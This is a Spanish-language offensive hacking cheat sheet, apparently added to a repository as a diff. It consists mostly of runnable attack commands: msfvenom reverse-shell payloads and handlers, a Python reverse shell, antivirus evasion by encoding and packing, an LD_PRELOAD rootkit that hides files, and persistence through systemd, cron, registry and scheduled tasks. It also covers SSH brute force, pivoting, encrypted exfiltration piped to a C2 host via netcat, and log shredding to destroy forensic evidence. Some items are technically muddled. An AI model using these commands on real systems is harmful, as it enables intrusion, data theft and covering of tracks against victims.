+# 1️⃣ Generar un payload básico con msfvenom
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o payload.exe
+
+# 2️⃣ Entender el payload generado (binario)
+# Puedes usar herramientas como msfelfscan, strings, objdump para analizarlo
+msfelfscan -a payload.exe
+strings payload.exe | less
+
+# 3️⃣ Crear un payload simple en Python (reverse shell)
+cat << 'EOF' > reverse_shell.py
+import socket, subprocess, os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<TU_IP>",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+EOF
+
+# 4️⃣ Convertir el script Python en un ejecutable (opcional)
+pyinstaller --onefile reverse_shell.py
+
+# 5️⃣ Exploit básico en C (buffer overflow ejemplo)
+cat << 'EOF' > simple_exploit.c
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    char buffer[100];
+    // Simulación de overflow
+    strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+    printf("Buffer overflow triggered!\n");
+    return 0;
+}
+EOF
+
+gcc -o simple_exploit simple_exploit.c
+
+# 6️⃣ Probar y depurar el exploit
+gdb ./simple_exploit
+
+##############################################
+##############################################
+# 🔎 INGENIERÍA INVERSA Y EVASIÓN AVANZADA
+# Desensamblado, análisis de binarios y anti-análisis
+##############################################
+
+# 1️⃣ Desensamblado y análisis estático
+objdump -d payload.exe > payload.asm                   # Desensamblado del binario
+strings payload.exe | less                             # Buscar cadenas legibles
+readelf -a payload.exe                                 # Información ELF/PE
+
+# 2️⃣ Análisis dinámico con debugger
+gdb ./payload                                         # Depuración en Linux
+windbg -y symbol_path -i image_path -g payload.exe   # Depuración en Windows
+
+# 3️⃣ Análisis y manipulación con radare2
+r2 -A payload.exe
+# Dentro de radare2:
+# pdf @ main  (mostrar función main)
+# afl         (listar funciones)
+# s main      (ir a main)
+
+# 4️⃣ Evasión básica de antivirus (AV)
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 -e x64/xor_dynamic -i 20 -f exe > evasive_payload.exe
+upx --best --lzma evasive_payload.exe                # Compresión y ofuscación
+
+# 5️⃣ Técnicas anti-debug y anti-VM
+# Uso de checksums y consultas de entorno (ejemplo en C)
+cat << 'EOF' > anti_debug.c
+#include <stdio.h>
+#include <windows.h>
+
+int is_debugger_present() {
+    return IsDebuggerPresent();
+}
+
+int main() {
+    if(is_debugger_present()) {
+        printf("Debugger detected. Exiting.\n");
+        return 1;
+    }
+    printf("No debugger detected.\n");
+    return 0;
+}
+EOF
+
+gcc anti_debug.c -o anti_debug.exe
+
+# 6️⃣ Análisis de comportamiento dinámico
+strace ./payload                                         # Rastrea llamadas al sistema Linux
+procmon.exe                                              # Monitor de procesos Windows (Sysinternals)
+
+##############################################
+##############################################
+# 👾 DESARROLLO DE ROOTKITS Y PERSISTENCIA AVANZADA
+# Control profundo y camuflado en sistemas Linux y Windows
+##############################################
+
+# 1️⃣ Rootkits en Linux - Básico: uso de LD_PRELOAD para hookear funciones
+cat << 'EOF' > rootkit.c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdio.h>
+#include <dirent.h>
+#include <string.h>
+
+typedef int (*orig_readdir_t)(DIR *dir, struct dirent *entry);
+
+int readdir(DIR *dir, struct dirent *entry) {
+    orig_readdir_t orig_readdir;
+    orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");
+    int ret = orig_readdir(dir, entry);
+    if (entry && strcmp(entry->d_name, "malicious_file") == 0) {
+        ret = orig_readdir(dir, entry); // Oculta el archivo malicioso
+    }
+    return ret;
+}
+EOF
+
+gcc -shared -fPIC -o rootkit.so rootkit.c -ldl
+
+# Uso:
+# export LD_PRELOAD=./rootkit.so
+
+# 2️⃣ Persistencia en Linux: systemd service malicioso
+cat << 'EOF' > /etc/systemd/system/sysupdate.service
+[Unit]
+Description=System Update
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /tmp/payload.py
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable sysupdate.service
+systemctl start sysupdate.service
+
+# 3️⃣ Rootkits en Windows - Kernel mode (Ejemplo conceptual)
+# Uso de herramientas como DKOM para ocultar procesos o archivos
+# Se requiere desarrollo en C con Windows Driver Kit (WDK)
+# Ejemplo simple para ocultar un proceso del listado (no código real aquí por seguridad)
+
+# 4️⃣ Persistencia en Windows: Registro y tareas programadas
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f
+
+schtasks /create /sc onlogon /tn "SysUpdate" /tr "C:\\Windows\\Temp\\payload.exe"
+
+# 5️⃣ Técnicas anti-rootkit y detección evasiva
+# Uso de firmas y checksums variables
+# Inyección de código en procesos legítimos (Process Hollowing)
+# Técnicas de polimorfismo y metamorfismo
+
+##############################################
+// rootkit.c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+
+typedef struct dirent* (*orig_readdir_type)(DIR*);
+
+struct dirent* readdir(DIR* dir) {
+    static orig_readdir_type orig_readdir = NULL;
+    if (!orig_readdir) {
+        orig_readdir = (orig_readdir_type)dlsym(RTLD_NEXT, "readdir");
+    }
+    struct dirent* entry = orig_readdir(dir);
+    if (entry && strcmp(entry->d_name, "malicious_file") == 0) {
+        // Oculta el archivo malicioso saltándolo
+        return orig_readdir(dir);
+    }
+    return entry;
+}
+
+gcc -shared -fPIC -o rootkit.so rootkit.c -ldl
+export LD_PRELOAD=$(pwd)/rootkit.so
+ls -la
+
+##############################################
+# 🎯 COMANDOS Y FLUJOS OPERATIVOS PARA OPERATIVA 8200
+##############################################
+
+# 1️⃣ Reconocimiento avanzado y SIGINT
+
+# Enumerar subdominios con amass (reconocimiento pasivo/activo)
+amass enum -passive -d objetivo.com -o subdominios.txt
+amass enum -active -d objetivo.com -o subdominios_activos.txt
+
+# Escaneo y detección avanzada de vulnerabilidades
+nmap -sS -sV -O -p- --script vuln,auth -T4 objetivo_ip
+
+# Recolección SIGINT y análisis multi-fuente
+shodan download --limit 10000 objetivo.shdn "org:'Objetivo'"
+jq '.matches[].ip_str' objetivo.shdn | sort | uniq > ips_unicos.txt
+
+# 2️⃣ Acceso y explotación
+
+# Creación de payloads avanzados y ofuscados
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=<IP> LPORT=443 -e x64/xor_dynamic -i 50 -f elf -o payload.elf
+upx --best --lzma payload.elf
+
+# Lanzar handler Metasploit para recibir sesiones
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_https; set LHOST <IP>; set LPORT 443; exploit -j -z"
+
+# Fuerza bruta multihilo para SSH
+hydra -L users.txt -P passwords.txt ssh://objetivo_ip -t 64 -w 3
+
+# 3️⃣ Movimiento lateral y pivoting
+
+# Creación de túnel SOCKS dinámico con ssh para pivotar
+proxychains ssh -D 9050 usuario@pivot_host
+
+# Redireccionar todo el tráfico a través del host comprometido
+sshuttle -r usuario@pivot_host 0.0.0.0/0 --dns
+
+# 4️⃣ Persistencia avanzada
+
+# Añadir tarea cron para persistencia
+(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /tmp/payload.py") | crontab -
+
+# Crear servicio systemd persistente
+cat << EOF > /etc/systemd/system/secure_update.service
+[Unit]
+Description=Secure Update Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /tmp/payload.py
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl daemon-reload
+systemctl enable secure_update.service
+systemctl start secure_update.service
+
+# 5️⃣ Exfiltración cifrada
+
+# Enviar datos comprimidos y cifrados por netcat
+tar czf - /datos_secrecy | openssl enc -aes-256-cbc -salt -k clave_secreta | nc <C2_IP> 4444
+
+# Sincronización remota cifrada con rclone
+rclone copy /datos_secrecy remote:backup --crypt-password clave
+
+# 6️⃣ Limpieza y anti-forense
+
+# Limpieza historial bash
+history -c && history -w
+rm -f ~/.bash_history
+
+# Borrar logs de sistema
+find /var/log -type f -exec shred -u {} \;
+
+# Limpieza eventos Windows
+wevtutil cl Security
+
+##############################################
+##############################################
+# 🚀 Técnica de Pentesting Nirith — Paso a Paso
+##############################################
+
+# 1️⃣ Reconocimiento y Preparación
+# Recopila toda la inteligencia posible (OSINT) sobre el objetivo
+amass enum -passive -d objetivo.com -o subdominios.txt
+subfinder -d objetivo.com -o subfinder_output.txt
+shodan host objetivo_ip
+theharvester -d objetivo.com -b all -l 100
+
+# 2️⃣ Escaneo y Enumeración
+# Escanea puertos, servicios y versiones
+nmap -sS -sV -O -p- --script vuln objetivo_ip
+masscan objetivo_ip -p0-65535 --rate=10000
+enum4linux -a objetivo_ip
+ldapsearch -x -h objetivo_ip -b "dc=dominio,dc=com"
+
+# 3️⃣ Análisis de Vulnerabilidades y Validación
+nmap --script vuln,auth -p <puertos> objetivo_ip
+nikto -host http://objetivo_ip
+wpscan --url http://objetivo_ip
+
+# 4️⃣ Explotación Inicial
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<tu_IP> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f elf -o shell.elf
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST <tu_IP>; set LPORT 4444; exploit -j -z"
+
+# 5️⃣ Elevación de Privilegios y Movimiento Lateral
+sudo -l
+linux-exploit-suggester.sh
+mimikatz.exe
+proxychains ssh -D 9050 usuario@host_intermedio
+sshuttle -r usuario@host_intermedio 0.0.0.0/0 --dns
+
+# 6️⃣ Persistencia y Control
+(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /tmp/payload.py") | crontab -
+cat << EOF > /etc/systemd/system/secure_update.service
+[Unit]
+Description=Secure Update Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /tmp/payload.py
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl daemon-reload
+systemctl enable secure_update.service
+systemctl start secure_update.service
+
+# 7️⃣ Exfiltración y Limpieza
+tar czf - /datos_sensibles | openssl enc -aes-256-cbc -salt -k clave_secreta | nc <IP_C2> 4444
+rclone copy /datos_sensibles remote:backup --crypt-password clave_secreta
+
+history -c && history -w
+rm -f ~/.bash_history
+find /var/log -type f -exec shred -u {} \;
+wevtutil cl Security
+
+# 8️⃣ Reporte y Análisis Final
+# Documentar todo el proceso, puntos explotados y recomendaciones
+
+##############################################
+##############################################
+# ⚙️ Técnicas Avanzadas y Comandos para Pentesting Élite
+##############################################
+
+# 1️⃣ Automatización avanzada con scripts
+
+# Escaneo y explotación en un solo script bash (simplificado)
+cat << 'EOF' > auto_pentest.sh
+#!/bin/bash
+target=$1
+echo "[*] Escaneando $target"
+nmap -sS -sV -O -p- --script vuln $target -oN nmap_report.txt
+echo "[*] Buscando exploits"
+searchsploit --nmap nmap_report.txt > exploits.txt
+echo "[*] Intentando explotación automática"
+# Aquí integrarías exploits automáticos o msfconsole con scripts
+EOF
+chmod +x auto_pentest.sh
+
+# Uso: ./auto_pentest.sh <IP>
+
+# 2️⃣ Técnicas de evasión y ofuscación
+
+# Codificar payload en base64 para evadir filtros simples
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<IP> LPORT=443 -f raw | base64 -w0 > payload.b64
+
+# Uso de scripts PowerShell ofuscados
+powershell -nop -w hidden -EncodedCommand <base64encodedcommand>
+
+# 3️⃣ Uso de herramientas SIGINT y OSINT combinadas
+
+# Buscar metadatos en documentos públicos para encontrar hosts y usuarios
+exiftool documento.pdf
+metagoofil -d objetivo.com -t pdf,doc,xls,ppt -l 100
+
+# 4️⃣ Pivoting avanzado
+
+# Uso de socat para crear túneles TCP/UDP cifrados
+socat TCP-LISTEN:4444,reuseaddr,fork TCP:target_ip:4444
+
+# Uso de chisel para túneles reversos rápidos y confiables
+chisel client <C2_IP>:8080 8080:localhost:22
+
+# 5️⃣ Análisis post-explotación
+
+# Enumerar usuarios y grupos en Windows
+net user
+net localgroup administrators
+
+# Listar procesos y conexiones en Linux
+ps aux
+netstat -tulpn
+
+# 6️⃣ Seguridad operacional (OPSEC)
+
+# Uso de VPNs y proxies antes y durante la operación
+torify curl ifconfig.me
+
+# Borrado de rastros en Windows y Linux
+wevtutil cl Security
+echo > ~/.bash_history && history -c
+
+##############################################
